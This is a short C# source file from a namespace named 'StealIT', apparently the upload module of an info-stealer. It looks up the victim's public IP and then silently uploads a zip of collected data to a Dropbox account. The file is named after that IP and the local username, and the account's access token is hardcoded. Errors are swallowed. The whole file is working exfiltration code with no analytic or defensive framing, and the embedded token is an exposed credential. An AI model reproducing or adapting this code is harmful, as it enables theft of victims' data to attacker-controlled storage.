using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using Dropbox.Api;
using Dropbox.Api.Files;

namespace StealIT
{
    class DropBoxAPI
    {
        static WebClient webClient = new WebClient();
        static string publicIp = webClient.DownloadString("https://api.ipify.org");

        public static async Task Upload(byte[] content)
        {
            using (var dbx = new DropboxClient("q7Rt0qxNOIAAAAAAAAAAEgfEcRXVghMSvwI8ImKdwMrd3jhMB1Ad7smFIwgDtwhi"))
            {
                var mem = new MemoryStream(content);
                try
                {
                    var updated = await dbx.Files.UploadAsync(
                        string.Format("/"+  publicIp +  "_" +  Environment.UserName +  ".zip"),
                        WriteMode.Overwrite.Instance,
                        body: mem);
                } catch { }
            }

        }
    }
}
